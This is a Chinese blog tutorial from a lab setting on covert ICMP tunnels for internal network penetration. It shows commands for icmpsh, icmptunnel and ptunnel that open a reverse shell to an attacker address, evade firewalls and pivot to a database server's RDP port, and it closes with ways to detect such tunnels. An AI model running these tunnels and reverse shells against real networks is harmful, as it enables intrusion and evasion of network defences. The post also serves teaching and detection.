<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="内网渗透之ICMP隐藏隧道"><meta name="keywords" content="内网渗透"><meta name="author" content="我是小吴啦"><meta name="copyright" content="我是小吴啦"><title>内网渗透之ICMP隐藏隧道 | Chen's Blog</title><link rel="shortcut icon" href="/4.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#建立ICMP隧道"><span class="toc-number">2.</span> <span class="toc-text">建立ICMP隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#工作原理"><span class="toc-number">2.1.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#icmpsh"><span class="toc-number">2.2.</span> <span class="toc-text">icmpsh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#icmptunnel"><span class="toc-number">2.3.</span> <span class="toc-text">icmptunnel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ptunnel"><span class="toc-number">2.4.</span> <span class="toc-text">ptunnel</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#应对icmp隧道措施"><span class="toc-number">3.</span> <span class="toc-text">应对icmp隧道措施</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">我是小吴啦</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">82</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">7</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://jagger2zr.com" target="_blank" rel="noopener">Jagger</a><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">mochazz学长</a><a class="author-info-links__name text-center" href="https://www.cnblogs.com/bflw/" target="_blank" rel="noopener">强哥</a><a class="author-info-links__name text-center" href="http://p0desta.com/" target="_blank" rel="noopener">p0desta</a><a class="author-info-links__name text-center" href="https://github.com/Bypass007" target="_blank" rel="noopener">Bypass师傅</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Chen's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">内网渗透之ICMP隐藏隧道</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-06-04</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    内网渗透完成信息收集后，流量是否能够正常进出，是内网渗透中需要考虑的地方之一</p>
<a id="more"></a>

<p>​    ICMP（Internet ControllerMessages Protocol,网间控制报文协议）是TCP/IP协议族的子协议，是一种面向无连接的协议。用于在IP<a href="https://baike.baidu.com/item/主机/455151" target="_blank" rel="noopener">主机</a>、<a href="https://baike.baidu.com/item/路由" target="_blank" rel="noopener">路由</a>器之间传递控制消息。控制消息是指<a href="https://baike.baidu.com/item/网络通" target="_blank" rel="noopener">网络通</a>不通、<a href="https://baike.baidu.com/item/主机/455151" target="_blank" rel="noopener">主机</a>是否可达、<a href="https://baike.baidu.com/item/路由/363497" target="_blank" rel="noopener">路由</a>是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p>
<p>​    参考文章：<a href="https://baike.baidu.com/item/ICMP/572452?fr=kg_qa" target="_blank" rel="noopener">https://baike.baidu.com/item/ICMP/572452?fr=kg_qa</a></p>
<p>​    在一些网络环境中，如果攻击者使用各类上层隧道（例如HTTP隧道，DNS隧道，正反向端口转发等）进行操作均失败。那么可以尝试使用ICMP建立隧道，ICMP协议不需要端口的开放，因为其基于IP工作的，所以我们将其归结到网络层，ICMP消息最为常见的就是ping命令的回复，将TCP/UDP数据包封装到ICMP的ping数据包中，从而穿过防火墙（通常防火墙是不会屏蔽ping数据包的）</p>
<h1 id="建立ICMP隧道"><a href="#建立ICMP隧道" class="headerlink" title="建立ICMP隧道"></a>建立ICMP隧道</h1><p>​    用于建立ICMP隧道的工具一般用<code>icmpsh</code>，<code>icmptunnel</code>，<code>ptunnel</code>，<code>icmpshell</code></p>
<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>​    请求端的 Ping 工具通常会在 ICMP 数据包后面附加上一段随机的数据作为 Payload，而响应端则会拷贝这段 Payload 到 ICMP 响应数据包中返还给请求端，用于识别和匹配 Ping 请求。</p>
<p>​    Windows 和 Linux 系统下的 Ping 工具默认的 Payload 长度为 64 比特，但实际上协议允许附加最大 64K 大小的 Payload。</p>
<p>​    对于隧道数据，icmptunnel 首先会指定客户端和服务器端。随后，客户端会将 IP 帧封装在 ICMP 请求数据包中发送给服务器，而服务器端则会使用相匹配的 ICMP 响应数据包进行回复。这样在旁人看来，网络中传播的仅仅只是正常的 ICMP 数据包。</p>
<h2 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h2><p>​    工具安装</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/inquisb/icmpsh.git #下载工具</span></span><br><span class="line"></span><br><span class="line">apt-get install python-impacket <span class="comment">#安装依赖</span></span><br><span class="line">     </span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=<span class="number">1</span>  <span class="comment">#关闭本地ICMP应答</span></span><br></pre></td></tr></table></figure>



<pre><code>`icmpsh`的使用场景如下：</code></pre><p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/1.png" alt="image-20200605075817950"></p>
<p>​    服务器暴露在外网上，可以访问外部网络，但是服务上有防火墙，拒绝了敏感端口的连接（比如22端口，3389端口等）。使用<code>icmpsh</code>的目的就是为了能够绕过对敏感端口的限制，此时ICMP作为获取反向shell的通道，进行反向shell.</p>
<p>​    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击者IP地址：	<span class="number">192.168</span><span class="number">.1</span><span class="number">.76</span></span><br><span class="line">服务器IP地址：	<span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span></span><br></pre></td></tr></table></figure>

<p>​    被攻击的服务器端运行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpsh.exe -t <span class="number">192.168</span><span class="number">.1</span><span class="number">.76</span>（攻击者）</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/2.png" alt="image-20200605081719905"></p>
<p>​    </p>
<p>​    攻击者端运行<code>icmpsh</code>的控制端</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python icmpsh_m.py <span class="number">192.168</span><span class="number">.1</span><span class="number">.76</span>（攻击者） <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>（被攻击者）</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/3.png" alt="image-20200605081735359"></p>
<p>​    观察<code>wireshare</code>的流量变化，可以看到这里是由<code>192.168.1.113</code>向<code>192.168.1.76</code>发出request请求，这里也就印证了这里进行的是反向shell。</p>
<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/4.png" alt="image-20200605081954851"></p>
<h2 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h2><p>​    icmptunnel的优势在于可以穿过状态防火墙或NAT</p>
<p>​    一些设备会过滤没有匹配响应数据包的 Ping 包。而在非对称连接中，来自服务器端的流量会大于客户端，反之亦然，这样客户端可能会丢弃一些相应数据包，因为响应数据包多余请求数据包。</p>
<p>​    icmptunnel 有一个机制来专门解决这个问题。客户端会定期发送一个空的 ICMP 请求数据包给状态防火墙或 NAT，而这些请求数据包都会被记录在防火墙状态表中。同时通过保持发送带有载体的数据包，这样客户端会维持一个可以用于服务器端发送数据的“数据包窗口”。</p>
<p>参考:<a href="https://www.cnblogs.com/bonelee/p/7462218.html" target="_blank" rel="noopener">https://www.cnblogs.com/bonelee/p/7462218.html</a></p>
<p>​    安装icmptunnel</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/jamesbarlow/icmptunnel.git  </span></span><br><span class="line">cd icmptunnel</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>​    可能会出现缺少头文件的问题，参考文章:<a href="https://blog.csdn.net/zhutingting0428/article/details/51120949" target="_blank" rel="noopener">https://blog.csdn.net/zhutingting0428/article/details/51120949</a></p>
<p>​    使用场景和icmpsh一样（被攻击对象为linux的情况下）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击者IP：<span class="number">192.168</span><span class="number">.1</span><span class="number">.76</span></span><br><span class="line">被攻击者的IP：<span class="number">192.168</span><span class="number">.26</span></span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>​    攻击者开启icmptunnel服务端模式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">1</span> &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line"> ./icmptunnel –s</span><br></pre></td></tr></table></figure>

<p>​    <img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/11.png" alt="image-20200605103744643"></p>
<p>​    然后另开一个终端，执行命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/ifconfig tun0 <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>

<p>​    指定一个网卡tun0，用于给隧道服务器端分配一个IP地址(10.0.0.1)</p>
<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/13.png" alt="image-20200605103809033"></p>
<p>​    </p>
<p>​    被攻击者</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">1</span> &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line"> ./icmptunnel <span class="number">192.168</span><span class="number">.1</span><span class="number">.76</span></span><br></pre></td></tr></table></figure>

<p>​    <img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/14.png" alt="image-20200605103839133"></p>
<p>​    连接上攻击者的icmptunnel服务端，然后再开一个终端，执行命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/ifconfig tun0 <span class="number">10.0</span><span class="number">.0</span><span class="number">.2</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>

<p>​    指定IP地址为10.0.0.2</p>
<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/15.png" alt="image-20200605103855527"></p>
<p>​    此时建立了icmp隧道，在服务器端通过ssh连接被攻击对象</p>
<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/12.png" alt="image-20200605104454685"></p>
<h2 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h2><p>​    <code>ptunnel</code>就是工具<code>pingtunnel</code></p>
<p>​    安装过程如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装libpcap的依赖环境</span></span><br><span class="line">yum -y install byacc</span><br><span class="line">yum -y install flex bison</span><br><span class="line"> </span><br><span class="line"><span class="comment">#安装libpcap依赖库</span></span><br><span class="line">wget http:<span class="comment">//www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span></span><br><span class="line">tar -xzvf libpcap<span class="number">-1.9</span><span class="number">.0</span>.tar.gz</span><br><span class="line">cd libpcap<span class="number">-1.9</span><span class="number">.0</span></span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"> </span><br><span class="line"><span class="comment">#安装PingTunnel</span></span><br><span class="line">wget http:<span class="comment">//www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz</span></span><br><span class="line">tar -xzvf PingTunnel<span class="number">-0.72</span>.tar.gz</span><br><span class="line">cd PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>​    参考：<a href="https://mp.weixin.qq.com/s/AuGriK1Bha83rVYlGJpuUA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/AuGriK1Bha83rVYlGJpuUA</a></p>
<p>​    该工具在kali中是已经集成好的</p>
<p>​    现有场景如下：一个内网中，有一台Web服务器，一台数据库服务器，Web服务器可以ping通过数据库服务器，但是不能直接访问数据库服务器，已知数据库服务器此时有开启3389端口。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">攻击者的IP地址：<span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span>(win7)</span><br><span class="line">攻击者的VPS地址：<span class="number">192.168</span><span class="number">.1</span><span class="number">.76</span>(kali)</span><br><span class="line">    </span><br><span class="line">web服务器的IP地址：<span class="number">192.168</span><span class="number">.1</span><span class="number">.26</span>（外网）	<span class="number">172.168</span><span class="number">.1</span><span class="number">.16</span>（内网）(kali)</span><br><span class="line">数据库服务器的IP地址：<span class="number">172.168</span><span class="number">.1</span><span class="number">.18</span>（内网）(win server <span class="number">2008</span>)</span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>​    在攻击者的vps（192.168.1.76）中执行如下命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p <span class="number">192.168</span><span class="number">.1</span><span class="number">.26</span> -lp <span class="number">1080</span> -da <span class="number">172.168</span><span class="number">.1</span><span class="number">.18</span> -dp <span class="number">3389</span> -x cookie</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-p 	跳板的公网IP</span><br><span class="line">-lp	指定本机的监听端口</span><br><span class="line">-da	目标服务器的内网IP</span><br><span class="line">-dp 指定目标服务器的端口</span><br><span class="line">-x 	为隧道写一个隧道密码，防止隧道滥用</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/5.png" alt="image-20200605084715753"></p>
<p>​    </p>
<p>​    在Web服务器中执行命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -x cookie</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/6.png" alt="image-20200605084744776"></p>
<p>在攻击者的机器上访问自己的vps的1080端口</p>
<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/7.png" alt="image-20200605085138915"></p>
<p>​    可以看到我们虽然连接的是<code>192.168.1.76</code>，但是我们通过使用<code>web服务器</code>作为跳板，将vps的1080端口与数据库服务器的3389端口连接在一起了。</p>
<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/8.png" alt></p>
<p>​    观察<code>wireshark</code>的流量变化情况</p>
<p><img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/9.png" alt></p>
<p>​    <img src="/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/10.png" alt></p>
<h1 id="应对icmp隧道措施"><a href="#应对icmp隧道措施" class="headerlink" title="应对icmp隧道措施"></a>应对icmp隧道措施</h1><p>使用icmp隧道时，会集中在某个时间点产生大量的icmp数据包，可以通过wireshark进行icmp数据包分析</p>
<p>​        1.检测同源的icmp数据包数量，正常的ping命令每秒最多两个数据包，隧道会产生大量的数据包。</p>
<p>​        2.注意payload大于64bit的ICMP数据包</p>
<p>​        3.寻找响应数据包和请求数据包payload不一致的ICMP数据包。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows系统下ping默认传输的是： abcdefghijklmnopqrstuvwabcdefghi，共<span class="number">32</span>bytes</span><br><span class="line"></span><br><span class="line">linux系统下，ping默认传输的是<span class="number">48</span>bytes，前<span class="number">8</span>bytes随时间变化，后面的固定不变，内容为!”<span class="comment">#$%&amp;’()+,-./01234567</span></span><br></pre></td></tr></table></figure>

<p>​            参考:<a href="https://www.freebuf.com/articles/network/202634.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/202634.html</a></p>
<p>​        4.检查ICMP数据包的协议标签，比如icmptunnel会在所有icmp payload前面加上<code>TUNL</code>标识来标识隧道。</p>
<p>​    </p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">我是小吴啦</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/">http://yoursite.com/2020/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BICMP%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/06/07/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BC%A0%E8%BE%93%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"><i class="fa fa-chevron-left">  </i><span>内网渗透之传输层隧道技术</span></a></div><div class="next-post pull-right"><a href="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span>Credit-Card-vulnhub渗透测试</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By 我是小吴啦</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>